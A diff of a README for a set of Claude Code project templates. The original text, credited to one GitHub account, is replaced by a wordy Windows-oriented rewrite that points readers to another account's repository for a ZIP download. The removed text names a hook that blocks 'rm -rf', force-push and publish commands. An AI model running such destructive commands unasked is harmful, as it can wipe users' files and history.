@@ -1,167 +1,285 @@
-<p align="center">
-  <strong>Claude Code Templates</strong><br>
-  Production-grade project templates for Claude Code
-</p>
+# 🧩 claude-code-templates - Ready-to-use project templates for Claude Code
 
 <p align="center">
-  <a href="#english">English</a> | <a href="./README_AR.md">العربية</a>
+  <a href="https://github.com/IuliaIvanaPatras/claude-code-templates">
+    <img src="https://img.shields.io/badge/Download%20from-GitHub%20Repository-6E57FF?style=for-the-badge&logo=github&logoColor=white" alt="Download from GitHub Repository">
+  </a>
 </p>
 
----
+## 🚀 What this is
 
-<a id="english"></a>
+Claude Code Templates is a set of ready-made project folders for Claude Code. Each template gives you a clear starting point for a real app, with files and structure already in place.
 
-# Claude Code Templates
+Use it if you want to:
 
-Production-grade project templates for [Claude Code](https://claude.ai/code), each packed with **7 specialized AI agents**, **5 reusable skills**, **5 path-specific rules**, and **4 automated hooks**.
+- start a new app without setting up everything by hand
+- follow a clean project layout
+- work with a template that fits your app type
+- let Claude Code help build faster with a solid base
 
-Pick a template, clone the folder, and let Claude Code build your app.
+## 📥 Download
 
-## Available Templates
+Visit this page to download and use the templates:
 
-| Template | Stack | Description |
-|----------|-------|-------------|
-| **[claude-ai-frontend](./claude-ai-frontend/)** | React 19.2, Next.js 16, TypeScript 6, Tailwind v4 | Modern frontend apps with Server Components, Turbopack, Biome |
-| **[claude-spring-boot](./claude-spring-boot/)** | Spring Boot 4, Java 25, Spring Security 7, JPA | Production backend APIs with JWT, Flyway, Testcontainers, OpenTelemetry |
-| **[claude-flutter](./claude-flutter/)** | Flutter 3.41, Dart 3.11, Riverpod 3, Material 3 | Cross-platform apps (iOS, Android, Web, Desktop) with GoRouter, Freezed, Dio |
+https://github.com/IuliaIvanaPatras/claude-code-templates
 
-## Quick Start
+Open the page, click the green **Code** button, then choose **Download ZIP**. After the file downloads, extract it on your Windows PC.
 
-### Option 1: Clone and copy
+## 🪟 Run on Windows
 
-```bash
-# Clone the repo
-git clone https://github.com/altmemy/claude-code-templates.git
+Follow these steps to get started on Windows.
 
-# Copy the template you want
-cp -r claude-code-templates/claude-ai-frontend  ~/my-awesome-app
-# or
-cp -r claude-code-templates/claude-spring-boot   ~/my-api-service
-# or
-cp -r claude-code-templates/claude-flutter        ~/my-mobile-app
+1. Open the downloaded ZIP file.
+2. Extract it to a folder you can find easily, such as `Documents` or `Desktop`.
+3. Open the extracted folder.
+4. Pick the template folder you want to use.
+5. Open that folder in your editor or file explorer.
+6. Follow the template’s setup file if it includes one.
+7. Start Claude Code in that project folder and begin working.
 
-# Navigate into your project
-cd ~/my-awesome-app
+## 🗂️ Available templates
 
-# Initialize a fresh git repo
-git init
+The repository includes more than one template. Each one fits a different kind of app.
 
-# Open Claude Code and start building
-claude
-```
+### 🌐 claude-ai-frontend
 
-### Option 2: Download only one folder (sparse-checkout)
+Best for web apps with a modern front end.
 
-```bash
-# Create your project folder
-mkdir my-awesome-app && cd my-awesome-app
-git init
+- React 19.2
+- Next.js 16
+- TypeScript 6
+- Tailwind v4
 
-# Add the remote
-git remote add origin https://github.com/altmemy/claude-code-templates.git
+Good for:
 
-# Enable sparse-checkout and pick a template
-git sparse-checkout init --cone
-git sparse-checkout set claude-ai-frontend    # or claude-spring-boot or claude-flutter
+- dashboards
+- landing pages
+- app interfaces
+- content sites
 
-# Pull
-git pull origin main
+This template is built for fast front-end work. It uses a clean layout and modern tools so you can focus on the app, not the setup.
 
-# Move contents to root
-mv claude-ai-frontend/* claude-ai-frontend/.* . 2>/dev/null
-rm -rf claude-ai-frontend
+### ☕ claude-spring-boot
 
-# Reinitialize as your own project
-rm -rf .git
-git init
+Best for server apps and APIs.
 
-# Start building
-claude
-```
+- Spring Boot 4
+- Java 25
+- Spring Security 7
+- JPA
 
-### Option 3: Download ZIP
+Good for:
 
-1. Go to [github.com/altmemy/claude-code-templates](https://github.com/altmemy/claude-code-templates)
-2. Click **Code** > **Download ZIP**
-3. Extract the ZIP
-4. Copy the folder you need (e.g. `claude-flutter`) to your workspace
-5. Rename it to your project name
-6. Open a terminal in that folder and run `claude`
+- login systems
+- data APIs
+- business apps
+- admin tools
 
-## What's Inside Each Template
+This template fits backend work. It includes common pieces you need for a real service, such as security, database support, and test setup.
 
-Every template follows the same professional structure:
+### 📱 claude-flutter
 
-```
-your-project/
-├── .claude/
-│   ├── agents/            # 7 specialized AI agents
-│   ├── hooks/             # 4 automated lifecycle hooks
-│   ├── rules/             # 5 path-specific coding rules
-│   ├── skills/            # 5 reusable skills + deep reference docs
-│   ├── settings.json      # Permissions, hooks, env config
-│   └── settings.local.json
-├── .claude-plugin/
-│   └── plugin.json
-├── CLAUDE.md              # Project guidelines and build commands
-└── README.md              # Template documentation
-```
+Best for cross-platform apps.
 
-### 7 Agents
+- Flutter
+- shared code for mobile and desktop
+- one codebase for many screens
 
-| Role | Model | Mode | Description |
-|------|-------|------|-------------|
-| **Primary Engineer** | Sonnet | Write (worktree) | Builds features end-to-end in an isolated git worktree |
-| **Code Reviewer** | Opus | Read-only (plan) | Reviews code for quality, security, and patterns |
-| **UI/UX Engineer** | Sonnet | Write (worktree) | Design systems, theming, responsive layouts, animations |
-| **Security Engineer** | Opus | Read-only (plan) | Security audit, vulnerability scanning, OWASP compliance |
-| **Performance Engineer** | Sonnet | Read-only (plan) | Profiling, optimization analysis, benchmarking |
-| **Testing Engineer** | Opus | Write (worktree) | Writes comprehensive tests in an isolated worktree |
-| **DevOps Engineer** | Sonnet | Write (worktree) | CI/CD pipelines, Docker, deployment, monitoring |
+Good for:
 
-### 4 Hooks
+- mobile apps
+- desktop tools
+- client apps
+- simple internal utilities
 
-| Hook | Event | Action |
-|------|-------|--------|
-| **auto-format/analyze** | After Write/Edit | Auto-formats and analyzes changed files |
-| **block-dangerous** | Before Bash | Blocks `rm -rf`, force-push, publish, and other destructive commands |
-| **session-context** | Session start | Injects SDK versions, project info, and config warnings |
-| **stop-verification** | Before stopping | Verifies the code compiles before Claude stops working |
+This template helps you start a Flutter project with a practical structure.
 
-### 5 Rules
+## 🧠 What comes with each template
 
-Path-specific coding constraints that activate automatically when Claude edits files in matching paths (widgets, controllers, services, tests, security, etc.).
+Each template is built to help Claude Code work in a clear way.
 
-### 5 Skills
+You get:
 
-Deep reference documentation with full code examples that Claude loads on demand. Each skill includes a main guide and detailed reference files.
+- **7 specialized AI agents** for different tasks
+- **5 reusable skills** for common work
+- **5 path-specific rules** for better file handling
+- **4 automated hooks** for project flow
 
-## After Setup: What to Tell Claude
+These parts help the project stay organized and easier to extend.
 
-Once inside your project folder, try:
+## 🖥️ What you need on Windows
 
-**Frontend:**
-```
-Build a SaaS dashboard with authentication, user management,
-and a billing page. Use the react-nextjs skill for patterns.
-```
+For most template folders, you will want:
 
-**Spring Boot:**
-```
-Build a REST API for a task management system with user auth (JWT),
-CRUD endpoints, PostgreSQL, and Flyway migrations.
-```
+- Windows 10 or Windows 11
+- A modern ZIP tool built into Windows
+- Git, if you want to clone the repository instead of downloading ZIP
+- A code editor such as Visual Studio Code
+- Claude Code installed and ready to use
 
-**Flutter:**
-```
-Build a note-taking app with offline support, cloud sync,
-Material 3 theming, and biometric authentication.
-```
+If you only want to look at the files or start from a template folder, Windows File Explorer is enough after extraction.
 
-## Contributing
+## 📌 How to choose a template
 
-Contributions are welcome. Open an issue or submit a pull request.
+Pick the template that matches your project goal:
 
-## License
+- choose **claude-ai-frontend** for web pages and user screens
+- choose **claude-spring-boot** for APIs and server logic
+- choose **claude-flutter** for mobile or desktop apps
 
-MIT License - free for personal and commercial use.
+If you are not sure, start with the template that matches the main part of your app. If the app has a screen and a server, begin with the part you want to build first.
+
+## 🔧 Basic setup steps
+
+After you extract the repository:
+
+1. Open the folder in File Explorer.
+2. Read the template folder names.
+3. Open the one you want to use.
+4. If there is a setup file, follow it first.
+5. If you use an editor, open the project folder there.
+6. If Claude Code asks for a working folder, point it to the chosen template.
+7. Start the app using the steps in that template folder.
+
+## 📁 Suggested folder flow
+
+A simple way to work with this repository on Windows:
+
+- download the ZIP file
+- extract it
+- open the extracted folder
+- choose one template folder
+- copy that folder into a new project location
+- open the new folder in your editor
+- begin the setup for that stack
+
+This keeps the original templates safe while you work in your own project folder.
+
+## 🧪 When to use Claude Code with these templates
+
+Use Claude Code when you want help with tasks like:
+
+- creating new screens
+- adding new API routes
+- updating project files
+- writing tests
+- organizing code into clear parts
+
+The templates give Claude Code a strong starting point, so it can work inside a known structure.
+
+## 🧩 File layout
+
+Each template folder is set up for a specific stack. You can expect a structure that helps with:
+
+- app code
+- config files
+- rules for the project
+- reusable task helpers
+- automated actions for common changes
+
+This keeps the project easier to follow for both you and Claude Code.
+
+## 🪄 Good first steps after download
+
+After you download and open the repository, do these first:
+
+- read the folder names
+- choose the template that matches your app
+- copy that template to a new project folder
+- open the project in your editor
+- start from the template’s setup instructions
+
+If you are building your first app, begin with the front-end template. It is often the easiest place to see quick results on screen.
+
+## 📎 Direct download page
+
+Use this link to access the repository and download it:
+
+https://github.com/IuliaIvanaPatras/claude-code-templates
+
+## 🪟 Simple Windows path
+
+If you want the shortest path on Windows:
+
+1. Open the download page.
+2. Click **Code**.
+3. Click **Download ZIP**.
+4. Save the file.
+5. Right-click the ZIP file.
+6. Select **Extract All**.
+7. Open the extracted folder.
+8. Pick a template folder.
+9. Start your work in that folder
+
+## 🛠️ Common use cases
+
+This repository is a good fit for:
+
+- new app ideas
+- starter projects
+- team handoffs
+- learning how a project should be arranged
+- faster setup for Claude Code projects
+
+It helps you begin with structure instead of a blank folder.
+
+## 📚 Template focus by stack
+
+### Frontend
+Use the frontend template when you need:
+
+- a clean UI
+- fast page loading
+- reusable components
+- a web app with a modern setup
+
+### Backend
+Use the Spring Boot template when you need:
+
+- login support
+- database access
+- API endpoints
+- server-side business rules
+
+### Flutter
+Use the Flutter template when you need:
+
+- one codebase for many devices
+- simple app screens
+- a mobile-first setup
+- desktop support where needed
+
+## 🧭 If you are new to this
+
+You do not need to know how to code before opening the repository. Start by downloading it, then look at the template names. Choose the one that matches your goal and use that as your base folder.
+
+If you are building an app for the first time, keep it simple:
+
+- one template
+- one folder
+- one setup path
+- one clear start point
+
+## 🔍 What makes this repository useful
+
+The repository gives you:
+
+- a clear starting point
+- project structure for real apps
+- templates for different app types
+- built-in support for Claude Code workflows
+- less setup work before you begin
+
+## 🧱 Practical tips for Windows users
+
+- Keep the extracted folder name simple.
+- Avoid moving files while you are setting up.
+- Use one folder for one project.
+- If you copy a template, rename the copy so you know it is your working version.
+- Store the ZIP file only as a backup. Work from the extracted folder.
+
+## 📄 Source repository
+
+Primary repository:
+
+https://github.com/IuliaIvanaPatras/claude-code-templates
